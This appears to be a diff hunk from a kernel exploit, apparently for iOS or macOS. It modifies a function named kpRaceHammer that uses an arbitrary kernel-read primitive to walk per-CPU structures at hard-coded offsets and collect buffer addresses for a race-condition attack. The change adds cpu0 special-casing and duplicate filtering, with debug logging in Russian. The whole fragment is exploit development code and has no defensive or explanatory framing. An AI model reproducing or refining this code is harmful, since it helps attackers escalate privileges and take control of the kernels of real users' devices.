@@ -5375,11 +5375,17 @@ static void *kpRaceHammer(void *arg)
     uint64_t bufVAs[12]; int ncpu = 0;
     for (int n = 0; n < 12; n++) {
         uint64_t cdn = tpl + (uint64_t)n * 0x6eb0;
-        uint64_t probe = kp_rc_kread64(cdn + 0x1a8);
-        if (!kpLooksLikeKernelPointer(probe)) break;
         uint64_t val = kp_rc_kread64(cdn + 0x1a0);
         uint64_t bv = kp_rc_kread64(slotBase + (val >> 16) + 8);
-        if (!kpLooksLikeKernelPointer(bv)) break;
+        if (n == 0) {
+            // cpu0 = template гарантированно (1.9.79): принимаем всегда
+            if (!kpLooksLikeKernelPointer(bv)) { GNOTE( [NSString stringWithFormat:@"  cpu0: val=%#llx bv=%#llx — невалиден, стоп", val, bv]); break; }
+        } else {
+            if (!kpLooksLikeKernelPointer(bv)) break;   // дальше cpu1..N — по валидности
+            BOOL dup = NO;
+            for (int q = 0; q < ncpu; q++) if (bufVAs[q] == bv) { dup = YES; break; }
+            if (dup) break;
+        }
         bufVAs[ncpu++] = bv;
         GNOTE( [NSString stringWithFormat:@"  cpu%d: val=%#llx bufVA=%#llx", n, val, bv]);
     }
